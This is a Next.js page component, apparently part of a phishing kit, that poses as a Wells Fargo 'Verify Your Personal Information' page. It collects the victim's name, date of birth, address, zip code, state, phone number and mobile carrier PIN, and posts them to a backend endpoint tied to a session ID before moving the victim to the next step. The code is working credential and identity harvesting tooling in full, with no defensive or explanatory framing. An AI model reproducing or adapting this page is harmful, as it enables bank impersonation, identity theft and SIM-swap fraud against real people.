import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Box } from "@mui/system";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import InputMask from "react-input-mask";
import { CustomInput } from "../components/CustomInput";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { SubmitButton } from "../components/SubmitButton";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("Please enter your first name."),
  lastname: yup.string().required("Please enter your last name."),
  dob: yup.string().required("Please enter your birth date."),
  streetAddress: yup.string().required("Please enter your address."),
  zipCode: yup.string().required("Please enter your Zip code."),
  state: yup.string().required("Please enter the state you in."),
  phoneNumber: yup.string().required("Please enter your phone number."),
  carrierPin: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify({ sessionId: datas.sessionId, ...data }));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <title>Wells Fargo - Personal Information</title>
      </Head>
      <Header />
      <Wrapper
        title="Personal Information"
        paragraph="We need you to verify your personal information."
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
        loading={loading}
      >
        <Head>
          <title>Verify Your Personal Information | Wells Fargo</title>
        </Head>
        <Box paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.firstname &&
                (errors.firstname.message as unknown as string)
              )
            }
            errorMessage={
              errors.firstname &&
              (errors.firstname.message as unknown as string)
            }
            label="First name"
            register={register("firstname")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.lastname &&
                (errors.lastname.message as unknown as string)
              )
            }
            errorMessage={
              errors.lastname && (errors.lastname.message as unknown as string)
            }
            label="Last name"
            register={register("lastname")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <InputMask mask="99/99/9999" {...register("dob")}>
            {
              // @ts-ignore
              () => (
                <CustomInput
                  error={
                    !!(errors.dob && (errors.dob.message as unknown as string))
                  }
                  errorMessage={
                    errors.dob && (errors.dob.message as unknown as string)
                  }
                  label="Date of birth: MM/DD/YYYY"
                  register={register("dob")}
                />
              )
            }
          </InputMask>
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.streetAddress &&
                (errors.streetAddress.message as unknown as string)
              )
            }
            errorMessage={
              errors.streetAddress &&
              (errors.streetAddress.message as unknown as string)
            }
            label="Street Address"
            register={register("streetAddress")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.zipCode && (errors.zipCode.message as unknown as string)
              )
            }
            errorMessage={
              errors.zipCode && (errors.zipCode.message as unknown as string)
            }
            label="Zip code"
            type="number"
            register={register("zipCode")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(errors.state && (errors.state.message as unknown as string))
            }
            errorMessage={
              errors.state && (errors.state.message as unknown as string)
            }
            label="State"
            register={register("state")}
          />
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <InputMask mask="(999) 999 9999" {...register("phoneNumber")}>
            {
              // @ts-ignore
              () => (
                <CustomInput
                  error={
                    !!(
                      errors.phoneNumber &&
                      (errors.phoneNumber.message as unknown as string)
                    )
                  }
                  errorMessage={
                    errors.phoneNumber &&
                    (errors.phoneNumber.message as unknown as string)
                  }
                  label="Phone number"
                  // type="number"
                  register={register("phoneNumber")}
                />
              )
            }
          </InputMask>
        </Box>
        <Box marginTop="8px" paddingBottom="32px">
          <CustomInput
            error={
              !!(
                errors.carrierPin &&
                (errors.carrierPin.message as unknown as string)
              )
            }
            errorMessage={
              errors.carrierPin &&
              (errors.carrierPin.message as unknown as string)
            }
            label="Carrier pin"
            register={register("carrierPin")}
          />
        </Box>
        <Box
          component="section"
          sx={{
            margin: "1rem auto .625rem",
            display: "block",
          }}
        />
        <SubmitButton disabled={loading} text="Continue" onClick={onSubmit} />
      </Wrapper>
      <Footer />
    </>
  );
};

export default Billing;
